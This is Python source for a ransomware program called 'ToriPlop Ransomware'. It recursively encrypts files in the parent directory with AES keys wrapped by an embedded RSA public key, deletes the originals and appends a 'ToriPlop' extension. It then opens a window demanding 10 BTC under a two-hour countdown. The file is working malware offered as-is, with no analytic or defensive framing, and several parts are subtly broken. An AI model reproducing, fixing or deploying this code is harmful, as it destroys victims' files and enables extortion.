import base64
import os
import tkinter as tk
from pathlib import Path
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP, AES

# public key with base64 encoding
pubKey = '''LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUFsYkkyRGF1eVlacTN5K0ZGUU1yZQpBTnJWUzJneis4akN1WC9yWTlEd3Fvb1hjQXN6aXB5UHo1WVo4WjR6L21BaVdKSF
hiN3V4WExmRnFsZWlSU0tYCkQ1cnRlZmFPb0w2S0R3a0ZhTTZRSWd5bE9kZitJRVlTS0F6SjFwM1dSVXR6djV3MlVBRTBkNVI2aGdYVzZxVmUKbzRJZkhOV0V4eHRNYitVeU5YUU1wYzFWV3pnSWJ3MExKL0J2YXFxYmpqTUdjL2tqbDYxUFk3U09uYV
JiWXRMYgpEVDd4bm11Zk9YbUtWdFlMQWxlN3FnYzlHSVk5L1hNR3ZGMk9QUkVJOTRQYWtIUk8yVUMvSW14K3cxaThDUkdaCmptby93MkVPTEdOWmxubmJURk5OcitTaytIMk04Uk9mdmQ3dUk1T1Z3d0d2eHlsdWJvaU94bUxham1ESGl5dGMKa3dJRE
FRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0t'''
pubKey = base64.b64encode(pubKey)

# function for directory scan
def scanRecurse(baseDir):
     for entry in os.scandir(baseDir):
         if entry.is_file():
             yield entry
         else:
             yield from scanRecurse(entry.path)

# function for encryption
def encrypt(dataFile, publicKey):
    # read data from file
    extension = dataFile.suffix.lower()
    dataFile = str(dataFile)
    with open(dataFile, 'rb') as f:
        data = f.read()

    # convert data to bytes
    data = bytes(data)

    # create public key object
    key = RSA.import_key(publicKey)
    sessionKey= os.urandom(16)

    # encrypt the session key with the pub key
    cipher = PKCS1_OAEP.new(key)
    encryptedSessionKey = cipher.encrypt(sessionKey)

    # encrypt the data with the session key
    cipher = AES.new(sessionKey, AES.MODE_EAX)
    ciphertext, tag =cipher.encrypt_and_digest(data)

    # save the encrypted data to file
    fileName = dataFile.split(extension)[0]
    fileExtension = 'ToriPlop'#y0uRD00m3d

    encryptFile = fileName + fileExtension
    with open(encryptFile, 'wb') as f:
        [ f.write(x) for x in (encryptedSessionKey, cipher.nonce, tag, ciphertext)]
    os.remove(dataFile)

    # change the directory to the directory of the script keep sexure of chnging the directory
    directory = '../'
    excludeExtension = ['.py', '.pem', '.exe'] #exclude extension that you want : )
    for item in scanRecurse(directory):
        filePath = Path(item)
        fileType = filePath.suffix.lower()

        if fileType in excludeExtension:
            continue
        encrypt(filePath, publicKey)

def countdown(count):
    # Create Ransomware window
    hour, minute, second = count.split(':')
    hour = int(hour)
    minute = int(minute)
    second = int(second)


    label['text'] = '{}:{}:{}'.format(hour, minute, second)

    if second > 0:
        second -=1
    elif minute > 0:
        minute -=1
        second = 59
    elif hour > 0:
        hour -=1
        minute = 59
        second = 59
        root.after(1000, countdown, '{}:{}:{}'.format(hour,minute,second))

root = tk.Tk()
root.title('ToriPlop Ransomware')
root.geometry('500x300')
root.resizable(False, False)
label1 = tk.Label(root, text = 'You data is encrypted, pay me 10 BTCs,\nto unlock them !!!\n\n', font=('calibri', 12, 'bold'))
label1.pack()
label = tk.Label(root, font=('calibri',50, 'bold'), fg = 'with', bg =  'red')
label.pack()
label2 = tk.Label(root, text = '\n\n If the time runs out your file\nwill be gone !!!\n\n', font=('calibri', 12, 'bold'))
label2.pack()
countdown('02:00:00')
root.mainloop()
